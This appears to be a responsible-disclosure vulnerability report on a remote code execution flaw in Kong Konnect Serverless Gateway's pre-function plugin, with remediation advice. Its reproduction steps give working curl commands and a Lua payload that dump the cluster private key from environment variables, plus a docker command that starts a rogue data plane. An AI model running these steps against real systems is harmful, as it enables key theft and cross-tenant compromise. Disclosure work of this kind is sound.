# CRITICAL: RCE via pre-function in Konnect Serverless Gateway allows cluster private key exfiltration and rogue data plane connection

## Summary

Kong Konnect Serverless Gateway allows authenticated users to attach a `pre-function` plugin that executes **arbitrary Lua code** on the shared gateway infrastructure.

Due to incomplete sandboxing, the Lua environment has access to `kong.vault.get()` and the built-in `env` vault backend. As a result, any tenant with plugin-management rights can read **any environment variable**, including:

- `KONG_CLUSTER_CERT`
- `KONG_CLUSTER_CERT_KEY` (cluster mTLS private key)
- other sensitive env-based secrets (DB / cloud credentials, etc., if present)

We successfully:

1. Executed arbitrary Lua code in `pre-function`.
2. Used `kong.vault.get("{vault://env/KONG_CLUSTER_CERT_KEY}")` to exfiltrate the **cluster private key**.
3. Decoded the key and used it to configure a **rogue data plane** that can join the victims control plane.

This gives a single tenant **full control over the shared Konnect Serverless cluster**.

**Severity:** CRITICAL (CVSS 9.8)  
`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`

---

## Affected Product / Environment

- **Product:** Kong Konnect (cloud.konghq.com)  Serverless Gateway
- **Component:** `pre-function` plugin (Serverless Functions)
- **Version:** `3.12.0.0-enterprise-edition` (Serverless Gateway)
- **Region:** EU
- **Test environment:**
  - Control Plane ID: `670fb8a9-bcce-4ed2-b436-844c047cd849`
  - Proxy URL: `https://kong-<redacted>.kongcloud.dev`
  - Org ID: `d269ecd9-acb9-4027-b19e-94b30fc86923`

All testing was done **only in my own Konnect organization**.

---

## Technical Details (Root Cause)

- Konnect exposes the `pre-function` plugin to tenants in the Serverless Gateway.
- `pre-function` executes arbitrary Lua in the **request path** for all proxied traffic.
- The untrusted Lua sandbox still exposes powerful PDK and Nginx APIs, including:
  - `kong.vault.get()`  reads arbitrary secrets from configured vaults.
  - The `env` vault backend  reads **any environment variable**.
- Konnect stores cluster mTLS material as env vars:
  - `KONG_CLUSTER_CERT`
  - `KONG_CLUSTER_CERT_KEY`
- There is no filtering of which vault references are allowed from tenant code.

Effectively, any tenant admin can call:

```lua
kong.vault.get("{vault://env/KONG_CLUSTER_CERT_KEY}")
```

from inside `pre-function` and retrieve the cluster private key for the shared Serverless Gateway.

---

## Steps to Reproduce

### Prerequisites

1. Konnect account with Serverless Gateway enabled (free trial is sufficient).
2. A user with permission to manage plugins for a Serverless control plane.
3. A captured Konnect JWT or PAT token.

```bash
export TOKEN="<YOUR_JWT_OR_PAT>"
export CP_ID="<YOUR_CONTROL_PLANE_ID>"
export PROXY_URL="https://<your-gateway>.kongcloud.dev"
export API_URL="https://eu.api.konghq.com/v2/control-planes/${CP_ID}/core-entities"
```

---

### Step 1  Ensure a clean pre-function state (optional)

```bash
PLUGIN_ID=$(curl -s "${API_URL}/plugins" \
  -H "Authorization: Bearer ${TOKEN}" |
  grep -o '"id":"[^"]*","name":"pre-function"' |
  grep -o '"id":"[^"]*"' | cut -d'"' -f4)

if [ -n "$PLUGIN_ID" ]; then
  curl -s -X DELETE "${API_URL}/plugins/${PLUGIN_ID}" \
    -H "Authorization: Bearer ${TOKEN}"
fi
```

---

### Step 2  Create malicious `pre-function` plugin (env vault exfiltration)

```bash
curl -s -X POST "${API_URL}/plugins" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "pre-function",
    "config": {
      "access": [
        "local out={\"ENV_VAULT_EXFIL\"}; local vars={\"PATH\",\"HOME\",\"KONG_PREFIX\",\"KONG_DATABASE\",\"KONG_CLUSTER_CERT\",\"KONG_CLUSTER_CERT_KEY\"}; for _,v in ipairs(vars) do local ref=\"{vault://env/\"..v..\"}\"; local ok,val=pcall(kong.vault.get, ref); out[#out+1]=v..\" = \"..tostring(val) end; kong.response.exit(200, table.concat(out, \\\"\\n\\"))"
      ]
    },
    "enabled": true
  }'
```

**Expected:** API responds `201/200` and creates a `pre-function` plugin.

---

### Step 3  Wait for propagation

```bash
sleep 15
```

---

### Step 4  Trigger the payload via the public Gateway URL

```bash
curl -s "${PROXY_URL}/test"
```

**Actual response (redacted):**

```text
ENV_VAULT_EXFIL
PATH = /usr/local/sbin:...
HOME = /root
KONG_PREFIX = /usr/local/kong
KONG_DATABASE = off
KONG_CLUSTER_CERT = <base64-encoded certificate>
KONG_CLUSTER_CERT_KEY = <base64-encoded private key>   <-- CRITICAL
AWS_ACCESS_KEY_ID = nil
AWS_SECRET_ACCESS_KEY = nil
...
```

At this point, the **cluster certificate and private key have been fully exfiltrated** directly from environment variables.

---

### Step 5  Decode and save the stolen keys

```bash
# Certificate
echo "<KONG_CLUSTER_CERT base64>" | base64 -d > cluster.crt

# Private key
echo "<KONG_CLUSTER_CERT_KEY base64>" | base64 -d > cluster.key
```

Resulting files are standard ECDSA P-256 X.509 cert + PKCS#8 private key (see `stolen_keys/cluster.crt` and `stolen_keys/cluster.key` in artifacts).

---

### Step 6  (Optional) Start a rogue Data Plane using the stolen key

This demonstrates the real-world impact but is **not strictly required** to verify the vulnerability.

```bash
docker run --rm --name evil-dp \
  -e "KONG_ROLE=data_plane" \
  -e "KONG_DATABASE=off" \
  -e "KONG_CLUSTER_CONTROL_PLANE=<victim-cp-host>:8005 or :443" \
  -e "KONG_CLUSTER_CERT=/etc/kong/cluster.crt" \
  -e "KONG_CLUSTER_CERT_KEY=/etc/kong/cluster.key" \
  -v $(pwd)/cluster.crt:/etc/kong/cluster.crt:ro \
  -v $(pwd)/cluster.key:/etc/kong/cluster.key:ro \
  kong/kong-gateway:3.12
```

**Expected:** The rogue data plane successfully joins the victims control plane and starts receiving configuration/traffic.

> For responsible testing I **did not** route real customer traffic through the rogue DP; this step can be treated as theoretical attack based on standard hybrid-mode behavior.

---

## Impact

Technical impact:

- **Complete cluster compromise**

  - Full disclosure of `KONG_CLUSTER_CERT_KEY` (cluster mTLS private key).
  - Attacker can connect arbitrary rogue data planes to the Konnect control plane.
  - Potential to passively observe or modify all routes, plugins, and traffic flowing through those data planes.

- **Remote Code Execution**

  - Any authenticated tenant with plugin-management rights can execute arbitrary Lua on the shared Serverless Gateway infrastructure.

- **Sensitive data exposure**

  - Same root cause also allows:
    - Theft of all request headers/cookies/bodies (`kong.request.get_header`, `kong.request.get_raw_body`), demonstrated in `CRITICAL_RCE_DATA_LEAK_FINAL.md`.
    - Dumping `kong.configuration` and `ngx.shared.prometheus_metrics`, revealing internal paths (`/run/secrets/kubernetes.io/serviceaccount/token`, `/usr/local/kong/.kong_process_secrets`, SSL cert/key locations, internal services like `k8s-api`, `aws-metadata`, etc.), see `CRITICAL_RCE_SECRETS_FINAL.md` and `HIGH_INFO_DISCLOSURE_FINAL.md`.

- **Scope change / multi-tenant risk**
  - Serverless Gateway is a shared SaaS environment; the leaked cluster key is for the **platform**, not just my tenant.
  - One malicious tenant could potentially impact other tenants using the same Serverless cluster.

Business impact:

- Possible **cross-tenant traffic interception and modification**.
- Compromise of Konnects control-plane/data-plane trust model.
- Potential non-compliance with **PCI-DSS / SOC2 / GDPR** due to key and data exposure.
- Significant reputational risk (Konnect leaked cluster private keys / cross-tenant RCE).

---

## Suggested Remediation

**Short term / P0**

1. **Block `kong.vault.get()` from untrusted Lua contexts** (`pre-function`, `post-function`, `custom_fields_by_lua`, etc.).
2. **Rotate all Konnect Serverless cluster certificates and private keys** that may have been accessible.
3. Audit all existing `pre-function` plugins in customer configurations for suspicious vault access patterns.

**Medium term**

4. Remove highly sensitive environment variables (cluster keys, DB passwords, cloud credentials) from the env and store them in more isolated mechanisms (e.g. K8s secrets mounted as files not visible to untrusted code).
5. Implement a **strict allowlist** of APIs available inside serverless Lua  only safe subset of PDK, no direct access to vaults, `kong.configuration`, or `ngx.shared`.
6. Add monitoring for unusual `vault.get()` usage in serverless contexts.

**Long term**

7. Re-evaluate whether fully dynamic tenant-supplied Lua (`pre-function`) is appropriate for a **multi-tenant SaaS** environment. Consider:
   - disabling `pre-function` for Serverless or
   - requiring reviewed/signed plugins only.

---

## Safe Testing / Notes

- All exploitation was done **only against my own Konnect organization and Serverless Gateway**.
- I did not attempt to access other organizations resources or real customer data.
- The rogue data plane connection step was treated as an attack scenario; I did not use it to intercept real third-party traffic.
- All artifacts (logs, keys in `stolen_keys/`) will be deleted after Kong confirms remediation, per program rules.
